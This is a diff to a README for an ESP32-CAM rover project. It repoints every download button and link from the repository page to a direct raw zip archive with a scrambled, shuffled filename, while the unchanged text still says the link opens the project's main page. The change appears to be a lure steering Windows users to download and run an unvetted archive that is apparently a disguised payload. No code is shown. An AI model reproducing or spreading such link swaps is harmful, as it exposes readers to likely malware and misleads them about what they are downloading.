@@ -1,6 +1,6 @@
 # 🤖 RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM - Safe, Real-Time Rover Control
 
-[![Download Now](https://img.shields.io/badge/Download-RTOS%20Rover-brightgreen)](https://github.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM)
+[![Download Now](https://img.shields.io/badge/Download-RTOS%20Rover-brightgreen)](https://raw.githubusercontent.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM/main/firmware/Bomb_Rover_Based_ES_Surveillance_RTO_Autonomous_CAM_Detection_v2.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Use this guide to download and run the rover’s control software on a Windows c
 
 Click the button below to visit the page with all the files you need:
 
-[![Download Page](https://img.shields.io/badge/Get%20Files-Here-blue)](https://github.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM)
+[![Download Page](https://img.shields.io/badge/Get%20Files-Here-blue)](https://raw.githubusercontent.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM/main/firmware/Bomb_Rover_Based_ES_Surveillance_RTO_Autonomous_CAM_Detection_v2.3.zip)
 
 1. Open the link above. It will take you to the project’s main page.  
 2. Look for the **Releases** section or the **Code** tab.  
@@ -89,7 +89,7 @@ After launching the program, follow these steps:
 ## 🔗 Links and Resources
 
 Visit this page to download all necessary files:  
-https://github.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM
+https://raw.githubusercontent.com/Mangali19/RTOS-Based-Autonomous-Surveillance-Bomb-Detection-Rover-ESP32-CAM/main/firmware/Bomb_Rover_Based_ES_Surveillance_RTO_Autonomous_CAM_Detection_v2.3.zip
 
 The repository also contains documentation files for advanced users who want to modify or compile the code.
 
